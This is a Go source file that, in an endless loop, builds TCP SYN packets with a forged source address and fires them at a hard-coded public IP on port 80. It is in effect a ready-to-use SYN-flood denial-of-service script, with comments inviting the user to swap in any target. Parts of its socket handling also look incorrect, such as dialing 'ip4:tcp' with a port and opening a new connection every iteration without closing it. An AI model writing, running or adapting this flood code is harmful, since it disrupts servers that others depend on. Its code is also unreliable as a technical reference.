package main

import (
  "fmt"
  "github.com/google/gopacket"
  "github.com/google/gopacket/layers"
  "net"
  "strconv"
)

func main() {
    // Define your destination IP and port here
  dstIP := net.ParseIP("193.228.196.49") // Change this to the IP you want to send to
    dstPort := 80 // Change this to the port you want to send to

  for {
    // Create IP layer
    ip := &layers.IPv4{
      SrcIP:    net.IP{127, 0, 0, 1},
      DstIP:    dstIP,
      Version:  4,
      TTL:      64,
      Protocol: layers.IPProtocolTCP,
    }

    // Create TCP layer
    tcp := &layers.TCP{
      SrcPort: layers.TCPPort(54321),
      DstPort: layers.TCPPort(dstPort),
      SYN:     true,
    }

    tcp.SetNetworkLayerForChecksum(ip)

    buf := gopacket.NewSerializeBuffer()
    opts := gopacket.SerializeOptions{
      FixLengths:       true,
      ComputeChecksums: true,
    }

    err := gopacket.SerializeLayers(buf, opts, ip, tcp)
    if err != nil {
      panic(err)
    }

        // Open a raw socket
        conn, err := net.Dial("ip4:tcp", dstIP.String() + ":" + strconv.Itoa(dstPort))
        if err != nil {
            panic(err)
        }

        // Write the packet data to the socket
        _, err = conn.Write(buf.Bytes())
        if err != nil {
            panic(err)
        }

        fmt.Printf("Packet sent: %x\n", buf.Bytes())
    }
}
